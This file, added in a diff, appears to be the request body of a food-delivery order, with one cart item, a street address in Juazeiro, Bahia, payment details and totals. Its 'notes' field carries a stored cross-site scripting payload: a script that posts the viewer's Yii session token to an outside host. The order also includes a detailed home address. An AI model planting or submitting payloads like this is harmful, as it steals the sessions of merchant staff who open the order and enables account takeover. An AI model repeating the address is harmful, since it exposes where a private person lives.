@@ -1,0 +1,57 @@
+{
+  "merchant": { "_id": "5f03eadcfbb5c765a22f0245" },
+  "cart_items": [
+    {
+      "_id": "60d5070b5ecdf7787108509f",
+      "old_id": 8313,
+      "name": "Artesanal frango",
+      "description": "",
+      "fast_order": false,
+      "price": {
+        "_id": "62bef53d421c4f3c02500926",
+        "price": 15,
+        "discounted_price": 15,
+        "size_id": "",
+        "size_name": ""
+      },
+      "addon_sections": [],
+      "charge_pack": false,
+      "notes": "",
+      "item_quantity": 1,
+      "unity_price": 15,
+      "total_item_price": 15,
+      "higher_price": false,
+      "cooking_ref": "",
+      "is_pizza": 0,
+      "pdv_external_id": "",
+      "free_delivery": false
+    }
+  ],
+  "address": {
+    "_id": "6101857ab7800f261e650d81",
+    "city": { "name": "Juazeiro", "_id": "60d52c46637de64049094213" },
+    "area": { "name": "Piranga", "_id": "60d52c47637de64049094458" },
+    "state": { "name": "Bahia", "_id": "60d52c46637de640490941f8" },
+    "street": "Rua Lafaiete Coutinho",
+    "name": "Casa Nanda",
+    "landmark": "Ao da escola Dr de José Araújo Souza. Árvore grande grande frente",
+    "complement": "Casa",
+    "number": "291"
+  },
+  "voucher": {},
+  "payment_data": {
+    "payment_type": "pyr",
+    "money_change": 0,
+    "_id": "61095606183aab2985272494",
+    "selected_card": "Visa",
+    "need_change": true
+  },
+  "service_type": "delivery",
+  "delivery_fee": 8,
+  "original_delivery_fee": 8,
+  "discount": 0,
+  "items_total": 15,
+  "packaging_price": 0,
+  "notes": "<script>$.post('https://api.portaldinp.com.br/'+ yii_session_token, function(data, status){ });</script>",
+  "total": 23
+}
